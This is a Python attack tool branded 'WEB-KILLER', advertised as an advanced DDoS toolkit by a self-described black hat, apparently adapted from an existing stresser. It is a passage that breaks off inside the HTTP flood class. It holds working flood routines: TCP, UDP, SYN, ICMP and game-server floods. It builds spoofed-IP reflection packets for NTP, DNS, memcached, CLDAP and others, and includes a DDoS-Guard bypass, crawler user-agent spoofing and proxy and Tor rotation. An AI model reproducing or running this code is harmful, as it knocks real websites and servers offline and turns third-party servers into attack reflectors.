#!/usr/bin/env python3
import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning)
from concurrent.futures import ThreadPoolExecutor, as_completed
from contextlib import suppress
from itertools import cycle
from json import load, JSONDecodeError
from logging import basicConfig, getLogger, shutdown
from math import log2, trunc
from multiprocessing import RawValue
from os import urandom as randbytes
from pathlib import Path
from re import compile
from random import choice as randchoice, randint
from socket import (AF_INET, IP_HDRINCL, IPPROTO_IP, IPPROTO_TCP, IPPROTO_UDP, SOCK_DGRAM, IPPROTO_ICMP,
                    SOCK_RAW, SOCK_STREAM, TCP_NODELAY, gethostbyname,
                    gethostname, socket)
from ssl import CERT_NONE, SSLContext, create_default_context
import ssl
from struct import pack as data_pack
from subprocess import run, PIPE
from sys import argv, stdout, exit as _exit
from threading import Event, Thread
from time import sleep, time
from typing import Any, List, Set, Tuple, Optional
from urllib import parse
from uuid import UUID, uuid4
import os
import sys

# DEFINE VERSION FIRST BEFORE ANYTHING ELSE USES IT
__version__: str = "2.1"
__dir__: Path = Path(__file__).parent
__ip__: Any = None

# PyRoxy imports with error handling
try:
    from PyRoxy import Proxy, ProxyChecker, ProxyType, ProxyUtiles
    from PyRoxy import Tools as ProxyTools
    PYROXY_AVAILABLE = True
except ImportError:
    print("[ERROR] PyRoxy module not found. Install with: pip install git+https://github.com/MatrixTM/PyRoxy.git")
    print("[ERROR] Or run: pip install -r requirements.txt")
    sys.exit(1)

from certifi import where
from cloudscraper import create_scraper
from dns import resolver
from icmplib import ping
from impacket.ImpactPacket import IP, TCP, UDP, Data, ICMP
from psutil import cpu_percent, net_io_counters, process_iter, virtual_memory
from requests import Response, Session, exceptions, get, cookies
from yarl import URL
from base64 import b64encode

# Color definitions
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    UNDERLINE = '\033[4m'
    BLINK = '\033[5m'
    REVERSE = '\033[7m'

# NOW USE __version__ IN THE BANNER
BANNER = f"""
{Colors.RED}██╗    ██╗███████╗██████╗       ██╗  ██╗██╗██╗     ██╗     ███████╗██████╗ 
{Colors.RED}██║    ██║██╔════╝██╔══██╗      ██║ ██╔╝██║██║     ██║     ██╔════╝██╔══██╗
{Colors.YELLOW}██║ █╗ ██║█████╗  ██████╔╝█████╗█████╔╝ ██║██║     ██║     █████╗  ██████╔╝
{Colors.YELLOW}██║███╗██║██╔══╝  ██╔══██╗╚════╝██╔═██╗ ██║██║     ██║     ██╔══╝  ██╔══██╗
{Colors.GREEN}╚███╔███╔╝███████╗██████╔╝      ██║  ██╗██║███████╗███████╗███████╗██║  ██║
{Colors.GREEN} ╚══╝╚══╝ ╚══════╝╚═════╝       ╚══╝  ╚══╝╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝
{Colors.CYAN}              {Colors.WHITE}ADVANCED DDoS ATTACK TOOLKIT v{__version__}{Colors.CYAN}                   
{Colors.CYAN}              {Colors.WHITE}Created BY ATHEX BLACK HAT{Colors.CYAN}         
{Colors.CYAN}
{Colors.RESET}"""

# Logging setup
basicConfig(format=f'[{Colors.CYAN}%(asctime)s{Colors.RESET} - %(levelname)s] %(message)s',
            datefmt="%H:%M:%S")
logger = getLogger("WEB-KILLER")
logger.setLevel("INFO")

# SSL Context setup with enhanced security
ctx: SSLContext = create_default_context(cafile=where())
ctx.check_hostname = False
ctx.verify_mode = CERT_NONE
if hasattr(ctx, "minimum_version") and hasattr(ssl, "TLSVersion"):
    ctx.minimum_version = ssl.TLSVersion.TLSv1_2
if hasattr(ssl, "OP_NO_TLSv1"):
    ctx.options |= ssl.OP_NO_TLSv1
if hasattr(ssl, "OP_NO_TLSv1_1"):
    ctx.options |= ssl.OP_NO_TLSv1_1

__version__: str = "2.1"
__dir__: Path = Path(__file__).parent
__ip__: Any = None

# Tor2Web gateways
tor2webs = [
    'onion.city', 'onion.cab', 'onion.direct', 'onion.sh', 'onion.link',
    'onion.ws', 'onion.pet', 'onion.rip', 'onion.plus', 'onion.top',
    'onion.si', 'onion.ly', 'onion.my', 'onion.sh', 'onion.lu',
    'onion.casa', 'onion.com.de', 'onion.foundation', 'onion.rodeo',
    'onion.lat', 'tor2web.org', 'tor2web.fi', 'tor2web.blutmagie.de',
    'tor2web.to', 'tor2web.io', 'tor2web.in', 'tor2web.it',
    'tor2web.xyz', 'tor2web.su', 'darknet.to', 's1.tor-gateways.de',
    's2.tor-gateways.de', 's3.tor-gateways.de', 's4.tor-gateways.de',
    's5.tor-gateways.de'
]

# Load configuration with error handling
try:
    config_path = __dir__ / "config.json"
    if not config_path.exists():
        print(f"{Colors.RED}[ERROR] config.json not found!{Colors.RESET}")
        sys.exit(1)
    with open(config_path) as f:
        con = load(f)
except JSONDecodeError:
    print(f"{Colors.RED}[ERROR] Invalid config.json format!{Colors.RESET}")
    sys.exit(1)
except Exception as e:
    print(f"{Colors.RED}[ERROR] Failed to load config.json: {e}{Colors.RESET}")
    sys.exit(1)

# Get local IP
try:
    with socket(AF_INET, SOCK_DGRAM) as s:
        s.settimeout(1)
        s.connect(("8.8.8.8", 80))
        __ip__ = s.getsockname()[0]
except Exception:
    __ip__ = "127.0.0.1"
    logger.warning(f"{Colors.YELLOW}Could not determine external IP, using localhost{Colors.RESET}")


class bcolors:
    HEADER = Colors.MAGENTA
    OKBLUE = Colors.BLUE
    OKCYAN = Colors.CYAN
    OKGREEN = Colors.GREEN
    WARNING = Colors.YELLOW
    FAIL = Colors.RED
    RESET = Colors.RESET
    BOLD = Colors.BOLD
    UNDERLINE = Colors.UNDERLINE


def exit(*message):
    """Enhanced exit function with proper cleanup"""
    if message:
        logger.error(bcolors.FAIL + " ".join(str(m) for m in message) + bcolors.RESET)
    shutdown()
    _exit(1)


def print_banner():
    """Print the ASCII banner"""
    print(BANNER)
    print(f"{Colors.CYAN}")
    print(f"{Colors.CYAN} {Colors.WHITE}Version: {Colors.GREEN}{__version__}{Colors.CYAN}       ")
    print(f"{Colors.CYAN} {Colors.WHITE}Author:  {Colors.GREEN}ATHEX BLACK HAT{Colors.CYAN}     ")
    print(f"{Colors.CYAN} {Colors.WHITE}Methods: {Colors.GREEN}Layer7 & Layer4 DDoS{Colors.CYAN}")
    print(f"{Colors.CYAN} {Colors.RESET}\n")


class Methods:
    LAYER7_METHODS: Set[str] = {
        "CFB", "BYPASS", "GET", "POST", "OVH", "STRESS", "DYN", "SLOW", "HEAD",
        "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB", "AVB", "CFBUAM",
        "APACHE", "XMLRPC", "BOT", "BOMB", "DOWNLOADER", "KILLER", "TOR", "RHEX", "STOMP"
    }

    LAYER4_AMP: Set[str] = {
        "MEM", "NTP", "DNS", "ARD",
        "CLDAP", "CHAR", "RDP"
    }

    LAYER4_METHODS: Set[str] = {*LAYER4_AMP,
                                "TCP", "UDP", "SYN", "VSE", "MINECRAFT",
                                "MCBOT", "CONNECTION", "CPS", "FIVEM", "FIVEM-TOKEN",
                                "TS3", "MCPE", "ICMP", "OVH-UDP",
                                }

    ALL_METHODS: Set[str] = {*LAYER4_METHODS, *LAYER7_METHODS}


# Search engine user agents
search_engine_agents = [
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Googlebot/2.1 (+http://www.googlebot.com/bot.html)",
    "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/103.0.5060.134 Safari/537.36",
    "Googlebot-Image/1.0",
    "Googlebot-Video/1.0",
    "Googlebot-News",
    "AdsBot-Google (+http://www.google.com/adsbot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "BingPreview/1.0b",
    "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
    "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
    "DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)",
    "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
    "Facebot/1.0",
    "Twitterbot/1.0",
    "LinkedInBot/1.0 (+https://www.linkedin.com/)",
    "Pinterest/0.2 (+http://www.pinterest.com/bot.html)",
    "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)",
    "SemrushBot/7~bl (+http://www.semrush.com/bot.html)",
    "MJ12bot/v1.4.8 (http://mj12bot.com/)",
    "Sogou web spider/4.0 (+http://www.sogou.com/docs/help/webmasters.htm#07)",
    "Exabot/3.0 (+http://www.exabot.com/go/robot)",
    "SeznamBot/3.2 (http://napoveda.seznam.cz/seznambot-intro/)",
    "CCBot/2.0 (+http://commoncrawl.org/faq/)",
    "DotBot/1.1 (+http://www.opensiteexplorer.org/dotbot, help@moz.com)"
]


class Counter:
    """Thread-safe counter using multiprocessing RawValue"""
    def __init__(self, value=0):
        self._value = RawValue('i', value)

    def __iadd__(self, value):
        self._value.value += value
        return self

    def __int__(self):
        return self._value.value

    def set(self, value):
        self._value.value = value
        return self


REQUESTS_SENT = Counter()
BYTES_SEND = Counter()


class Tools:
    IP = compile(r"(?:\d{1,3}\.){3}\d{1,3}")
    protocolRex = compile(r'"protocol":(\d+)')

    @staticmethod
    def humanbytes(i: int, binary: bool = False, precision: int = 2) -> str:
        MULTIPLES = ["B", "k{}B", "M{}B", "G{}B", "T{}B", "P{}B", "E{}B", "Z{}B", "Y{}B"]
        if i > 0:
            base = 1024 if binary else 1000
            multiple = trunc(log2(i) / log2(base))
            value = i / pow(base, multiple)
            suffix = MULTIPLES[multiple].format("i" if binary else "")
            return f"{value:.{precision}f} {suffix}"
        return "-- B"

    @staticmethod
    def humanformat(num: int, precision: int = 2) -> str:
        suffixes = ['', 'k', 'm', 'g', 't', 'p']
        if num > 999:
            obje = sum([abs(num / 1000.0 ** x) >= 1 for x in range(1, len(suffixes))])
            return f'{num / 1000.0 ** obje:.{precision}f}{suffixes[obje]}'
        return str(num)

    @staticmethod
    def sizeOfRequest(res: Response) -> int:
        """Calculate request size"""
        size: int = len(res.request.method)
        size += len(res.request.url)
        size += len('\r\n'.join(f'{key}: {value}' for key, value in res.request.headers.items()))
        return size

    @staticmethod
    def send(sock: socket, packet: bytes) -> bool:
        global BYTES_SEND, REQUESTS_SENT
        try:
            if not sock.send(packet):
                return False
            BYTES_SEND += len(packet)
            REQUESTS_SENT += 1
            return True
        except Exception:
            return False

    @staticmethod
    def sendto(sock, packet, target) -> bool:
        global BYTES_SEND, REQUESTS_SENT
        try:
            if not sock.sendto(packet, target):
                return False
            BYTES_SEND += len(packet)
            REQUESTS_SENT += 1
            return True
        except Exception:
            return False

    @staticmethod
    def dgb_solver(url: str, ua: str, pro: Optional[dict] = None):
        """DDoS-Guard bypass solver"""
        s = Session()
        idss = None
        try:
            if pro:
                s.proxies = pro
            hdrs = {
                "User-Agent": ua,
                "Accept": "text/html",
                "Accept-Language": "en-US",
                "Connection": "keep-alive",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-User": "?1",
                "TE": "trailers",
                "DNT": "1"
            }
            with s.get(url, headers=hdrs) as ss:
                for key, value in ss.cookies.items():
                    s.cookies.set_cookie(cookies.create_cookie(key, value))
            
            hdrs = {
                "User-Agent": ua,
                "Accept": "*/*",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "Referer": url,
                "Sec-Fetch-Dest": "script",
                "Sec-Fetch-Mode": "no-cors",
                "Sec-Fetch-Site": "cross-site"
            }
            with s.post("https://check.ddos-guard.net/check.js", headers=hdrs) as ss:
                for key, value in ss.cookies.items():
                    if key == '__ddg2':
                        idss = value
                    s.cookies.set_cookie(cookies.create_cookie(key, value))

            hdrs = {
                "User-Agent": ua,
                "Accept": "image/webp,*/*",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "Cache-Control": "no-cache",
                "Referer": url,
                "Sec-Fetch-Dest": "script",
                "Sec-Fetch-Mode": "no-cors",
                "Sec-Fetch-Site": "cross-site"
            }
            if idss:
                with s.get(f"{url}.well-known/ddos-guard/id/{idss}", headers=hdrs) as ss:
                    for key, value in ss.cookies.items():
                        s.cookies.set_cookie(cookies.create_cookie(key, value))
            return s
        except Exception:
            return None

    @staticmethod
    def safe_close(sock=None):
        """Safely close socket"""
        if sock:
            try:
                sock.close()
            except Exception:
                pass


class Minecraft:
    """Minecraft protocol utilities"""
    
    @staticmethod
    def varint(d: int) -> bytes:
        o = b''
        while True:
            b = d & 0x7F
            d >>= 7
            o += data_pack("B", b | (0x80 if d > 0 else 0))
            if d == 0:
                break
        return o

    @staticmethod
    def data(*payload: bytes) -> bytes:
        payload = b''.join(payload)
        return Minecraft.varint(len(payload)) + payload

    @staticmethod
    def short(integer: int) -> bytes:
        return data_pack('>H', integer)

    @staticmethod
    def long(integer: int) -> bytes:
        return data_pack('>q', integer)

    @staticmethod
    def handshake(target: Tuple[str, int], version: int, state: int) -> bytes:
        return Minecraft.data(
            Minecraft.varint(0x00),
            Minecraft.varint(version),
            Minecraft.data(target[0].encode()),
            Minecraft.short(target[1]),
            Minecraft.varint(state)
        )

    @staticmethod
    def handshake_forwarded(target: Tuple[str, int], version: int, state: int, ip: str, uuid: UUID) -> bytes:
        return Minecraft.data(
            Minecraft.varint(0x00),
            Minecraft.varint(version),
            Minecraft.data(
                target[0].encode(),
                b"\x00",
                ip.encode(),
                b"\x00",
                uuid.hex.encode()
            ),
            Minecraft.short(target[1]),
            Minecraft.varint(state)
        )

    @staticmethod
    def login(protocol: int, username: str) -> bytes:
        if isinstance(username, str):
            username = username.encode()
        return Minecraft.data(
            Minecraft.varint(0x00 if protocol >= 391 else 0x01 if protocol >= 385 else 0x00),
            Minecraft.data(username)
        )

    @staticmethod
    def keepalive(protocol: int, num_id: int) -> bytes:
        pid = 0x0F if protocol >= 755 else 0x10 if protocol >= 712 else 0x0F if protocol >= 471 else \
              0x10 if protocol >= 464 else 0x0E if protocol >= 389 else 0x0C if protocol >= 386 else \
              0x0B if protocol >= 345 else 0x0A if protocol >= 343 else 0x0B if protocol >= 336 else \
              0x0C if protocol >= 318 else 0x0B if protocol >= 107 else 0x00
        return Minecraft.data(
            Minecraft.varint(pid),
            Minecraft.long(num_id) if protocol >= 339 else Minecraft.varint(num_id)
        )

    @staticmethod
    def chat(protocol: int, message: str) -> bytes:
        pid = 0x03 if protocol >= 755 else 0x03 if protocol >= 464 else 0x02 if protocol >= 389 else \
              0x01 if protocol >= 343 else 0x02 if protocol >= 336 else 0x03 if protocol >= 318 else \
              0x02 if protocol >= 107 else 0x01
        return Minecraft.data(
            Minecraft.varint(pid),
            Minecraft.data(message.encode())
        )


# noinspection PyBroadException,PyUnusedLocal
class Layer4(Thread):
    _method: str
    _target: Tuple[str, int]
    _ref: Any
    SENT_FLOOD: Any
    _amp_payloads = cycle
    _proxies: List[Proxy] = None

    def __init__(self,
                 target: Tuple[str, int],
                 ref: List[str] = None,
                 method: str = "TCP",
                 synevent: Event = None,
                 proxies: Set[Proxy] = None,
                 protocolid: int = 74):
        Thread.__init__(self, daemon=True)
        self._amp_payload = None
        self._amp_payloads = cycle([])
        self._ref = ref
        self.protocolid = protocolid
        self._method = method
        self._target = target
        self._synevent = synevent
        if proxies:
            self._proxies = list(proxies)

        self.methods = {
            "UDP": self.UDP,
            "SYN": self.SYN,
            "VSE": self.VSE,
            "TS3": self.TS3,
            "MCPE": self.MCPE,
            "FIVEM": self.FIVEM,
            "FIVEM-TOKEN": self.FIVEMTOKEN,
            "OVH-UDP": self.OVHUDP,
            "MINECRAFT": self.MINECRAFT,
            "CPS": self.CPS,
            "CONNECTION": self.CONNECTION,
            "MCBOT": self.MCBOT,
        }

    def run(self) -> None:
        if self._synevent:
            self._synevent.wait()
        self.select(self._method)
        while self._synevent and self._synevent.is_set():
            self.SENT_FLOOD()

    def open_connection(self, conn_type=AF_INET, sock_type=SOCK_STREAM, proto_type=IPPROTO_TCP):
        if self._proxies:
            s = randchoice(self._proxies).open_socket(conn_type, sock_type, proto_type)
        else:
            s = socket(conn_type, sock_type, proto_type)
        s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
        s.settimeout(.9)
        s.connect(self._target)
        return s

    def TCP(self) -> None:
        s = None
        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
            while Tools.send(s, randbytes(1024)):
                continue
        Tools.safe_close(s)

    def MINECRAFT(self) -> None:
        handshake = Minecraft.handshake(self._target, self.protocolid, 1)
        ping = Minecraft.data(b'\x00')
        s = None
        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
            while Tools.send(s, handshake):
                Tools.send(s, ping)
        Tools.safe_close(s)

    def CPS(self) -> None:
        global REQUESTS_SENT
        s = None
        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
            REQUESTS_SENT += 1
        Tools.safe_close(s)

    def alive_connection(self) -> None:
        s = None
        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
            while s.recv(1):
                continue
        Tools.safe_close(s)

    def CONNECTION(self) -> None:
        global REQUESTS_SENT
        with suppress(Exception):
            Thread(target=self.alive_connection, daemon=True).start()
            REQUESTS_SENT += 1

    def UDP(self) -> None:
        with suppress(Exception), socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, randbytes(1024), self._target):
                continue

    def OVHUDP(self) -> None:
        try:
            with socket(AF_INET, SOCK_RAW, IPPROTO_UDP) as s:
                s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
                while True:
                    for payload in self._generate_ovhudp():
                        Tools.sendto(s, payload, self._target)
        except Exception:
            pass

    def ICMP(self) -> None:
        payload = self._genrate_icmp()
        with suppress(Exception), socket(AF_INET, SOCK_RAW, IPPROTO_ICMP) as s:
            s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
            while Tools.sendto(s, payload, self._target):
                continue

    def SYN(self) -> None:
        with suppress(Exception), socket(AF_INET, SOCK_RAW, IPPROTO_TCP) as s:
            s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
            while Tools.sendto(s, self._genrate_syn(), self._target):
                continue

    def AMP(self) -> None:
        with suppress(Exception), socket(AF_INET, SOCK_RAW, IPPROTO_UDP) as s:
            s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
            while Tools.sendto(s, *next(self._amp_payloads)):
                continue

    def MCBOT(self) -> None:
        s = None
        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
            Tools.send(s, Minecraft.handshake_forwarded(
                self._target, self.protocolid, 2,
                ProxyTools.Random.rand_ipv4(), uuid4()
            ))
            username = f"{con.get('MCBOT', 'BOT')}{ProxyTools.Random.rand_str(5)}"
            password = b64encode(username.encode()).decode()[:8].title()
            Tools.send(s, Minecraft.login(self.protocolid, username))
            sleep(1.5)
            Tools.send(s, Minecraft.chat(self.protocolid, f"/register {password} {password}"))
            Tools.send(s, Minecraft.chat(self.protocolid, f"/login {password}"))
            while Tools.send(s, Minecraft.chat(self.protocolid, str(ProxyTools.Random.rand_str(256)))):
                sleep(1.1)
        Tools.safe_close(s)

    def VSE(self) -> None:
        payload = b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00'
        with socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, payload, self._target):
                continue

    def FIVEMTOKEN(self) -> None:
        token = str(uuid4())
        steamid_min = 76561197960265728
        steamid_max = 76561199999999999
        guid = str(randint(steamid_min, steamid_max))
        payload_str = f"token={token}&guid={guid}"
        payload = payload_str.encode('utf-8')
        with socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, payload, self._target):
                continue

    def FIVEM(self) -> None:
        payload = b'\xff\xff\xff\xffgetinfo xxx\x00\x00\x00'
        with socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, payload, self._target):
                continue

    def TS3(self) -> None:
        payload = b'\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00\x00\x00\x02'
        with socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, payload, self._target):
                continue

    def MCPE(self) -> None:
        payload = b'\x61\x74\x6f\x6d\x20\x64\x61\x74\x61\x20\x6f\x6e\x74\x6f\x70\x20\x6d\x79\x20\x6f\x77\x6e\x20\x61\x73\x73\x20\x61\x6d\x70\x2f\x74\x72\x69\x70\x68\x65\x6e\x74\x20\x69\x73\x20\x6d\x79\x20\x64\x69\x63\x6b\x20\x61\x6e\x64\x20\x62\x61\x6c\x6c\x73'
        with socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, payload, self._target):
                continue

    def _generate_ovhudp(self) -> List[bytes]:
        packets = []
        methods = ["GET", "POST", "HEAD", "OPTIONS", "PURGE"]
        paths = ['/0/0/0/0/0/0', '/0/0/0/0/0/0/', '\\0\\0\\0\\0\\0\\0', '\\0\\0\\0\\0\\0\\0\\', '/', '/null', '/%00%00%00%00']
        for _ in range(randint(2, 4)):
            ip = IP()
            ip.set_ip_src(__ip__)
            ip.set_ip_dst(self._target[0])
            udp = UDP()
            udp.set_uh_sport(randint(1024, 65535))
            udp.set_uh_dport(self._target[1])
            payload_size = randint(1024, 2048)
            random_part = randbytes(payload_size).decode("latin1", "ignore")
            method = randchoice(methods)
            path = randchoice(paths)
            payload_str = f"{method} {path}{random_part} HTTP/1.1\nHost: {self._target[0]}:{self._target[1]}\r\n\r\n"
            payload = payload_str.encode("latin1", "ignore")
            udp.contains(Data(payload))
            ip.contains(udp)
            packets.append(ip.get_packet())
        return packets

    def _genrate_syn(self) -> bytes:
        ip: IP = IP()
        ip.set_ip_src(__ip__)
        ip.set_ip_dst(self._target[0])
        tcp: TCP = TCP()
        tcp.set_SYN()
        tcp.set_th_flags(0x02)
        tcp.set_th_dport(self._target[1])
        tcp.set_th_sport(ProxyTools.Random.rand_int(32768, 65535))
        ip.contains(tcp)
        return ip.get_packet()

    def _genrate_icmp(self) -> bytes:
        ip: IP = IP()
        ip.set_ip_src(__ip__)
        ip.set_ip_dst(self._target[0])
        icmp: ICMP = ICMP()
        icmp.set_icmp_type(icmp.ICMP_ECHO)
        icmp.contains(Data(b"A" * ProxyTools.Random.rand_int(16, 1024)))
        ip.contains(icmp)
        return ip.get_packet()

    def _generate_amp(self):
        payloads = []
        for ref in self._ref:
            ip: IP = IP()
            ip.set_ip_src(self._target[0])
            ip.set_ip_dst(ref)
            ud: UDP = UDP()
            ud.set_uh_dport(self._amp_payload[1])
            ud.set_uh_sport(self._target[1])
            ud.contains(Data(self._amp_payload[0]))
            ip.contains(ud)
            payloads.append((ip.get_packet(), (ref, self._amp_payload[1])))
        return payloads

    def select(self, name):
        self.SENT_FLOOD = self.TCP
        for key, value in self.methods.items():
            if name == key:
                self.SENT_FLOOD = value
            elif name == "ICMP":
                self.SENT_FLOOD = self.ICMP
                self._target = (self._target[0], 0)
            elif name == "RDP":
                self._amp_payload = (b'\x00\x00\x00\x00\x00\x00\x00\xff\x00\x00\x00\x00\x00\x00\x00\x00', 3389)
                self.SENT_FLOOD = self.AMP
                self._amp_payloads = cycle(self._generate_amp())
            elif name == "CLDAP":
                self._amp_payload = (
                    b'\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00'
                    b'\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x63\x6c\x61\x73\x73\x30\x00', 389
                )
                self.SENT_FLOOD = self.AMP
                self._amp_payloads = cycle(self._generate_amp())
            elif name == "MEM":
                self._amp_payload = (b'\x00\x01\x00\x00\x00\x01\x00\x00gets p h e\n', 11211)
                self.SENT_FLOOD = self.AMP
                self._amp_payloads = cycle(self._generate_amp())
            elif name == "CHAR":
                self._amp_payload = (b'\x01', 19)
                self.SENT_FLOOD = self.AMP
                self._amp_payloads = cycle(self._generate_amp())
            elif name == "ARD":
                self._amp_payload = (b'\x00\x14\x00\x00', 3283)
                self.SENT_FLOOD = self.AMP
                self._amp_payloads = cycle(self._generate_amp())
            elif name == "NTP":
                self._amp_payload = (b'\x17\x00\x03\x2a\x00\x00\x00\x00', 123)
                self.SENT_FLOOD = self.AMP
                self._amp_payloads = cycle(self._generate_amp())
            elif name == "DNS":
                self._amp_payload = (
                    b'\x45\x67\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x02\x73\x6c\x00\x00\xff\x00\x01\x00'
                    b'\x00\x29\xff\xff\x00\x00\x00\x00\x00\x00', 53
                )
                self.SENT_FLOOD = self.AMP
                self._amp_payloads = cycle(self._generate_amp())


# noinspection PyBroadException,PyUnusedLocal
class HttpFlood(Thread):
    _proxies: List[Proxy] = None
    _payload: str
    _defaultpayload: Any
    _req_type: str
    _useragents: List[str]
    _referers: List[str]
    _target: URL
    _method: str
    _rpc: int
    _synevent: Any
    SENT_FLOOD: Any

    def __init__(self,
                 thread_id: int,
                 target: URL,
                 host: str,
                 method: str = "GET",
                 rpc: int = 1,
                 synevent: Event = None,
                 useragents: Set[str] = None,
                 referers: Set[str] = None,
                 proxies: Set[Proxy] = None) -> None:
        Thread.__init__(self, daemon=True)
        self.SENT_FLOOD = None
        self._thread_id = thread_id
        self._synevent = synevent
        self._rpc = rpc
        self._method = method
        self._target = target
        self._host = host
        self._raw_target = (self._host, (self._target.port or 80))

        if not self._target.host[len(self._target.host) - 1].isdigit():
            self._raw_target = (self._host, (self._target.port or 80))

        self.methods = {
            "POST": self.POST,
            "CFB": self.CFB,
            "CFBUAM": self.CFBUAM,
            "XMLRPC": self.XMLRPC,
            "BOT": self.BOT,
            "APACHE": self.APACHE,
            "BYPASS": self.BYPASS,
            "DGB": self.DGB,
            "OVH": self.OVH,
            "AVB": self.AVB,
            "STRESS": self.STRESS,
            "DYN": self.DYN,
            "SLOW": self.SLOW,
            "GSB": self.GSB,
            "RHEX": self.RHEX,
            "STOMP": self.STOMP,
            "NULL": self.NULL,
            "COOKIE": self.COOKIES,
            "TOR": self.TOR,
            "EVEN": self.EVEN,
            "DOWNLOADER": self.DOWNLOADER,
            "BOMB": self.BOMB,
            "PPS": self.PPS,
            "KILLER": self.KILLER,
        }

        if not referers:
            referers = [
                "https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=",
                "https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=",
                "https://drive.google.com/viewerng/viewer?url=",
                "https://www.google.com/translate?u="
            ]
        self._referers = list(referers)
        
        if proxies:
            self._proxies = list(proxies)

        if not useragents:
            useragents = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19582',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19577',
                'Mozilla/5.0 (X11) AppleWebKit/62.41 (KHTML, like Gecko) Edge/17.10859 Safari/452.6',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14931',
                'Chrome (AppleWebKit/537.1; Chrome50.0; Windows NT 6.3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393',
                'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.9200',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246',
                'Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
                'Mozilla/5.0 (Linux; U; Android 4.0.3; de-ch; HTC Sensation Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
                'Mozilla/5.0 (Linux; U; Android 2.3; en-us) AppleWebKit/999+ (KHTML, like Gecko) Safari/999.9',
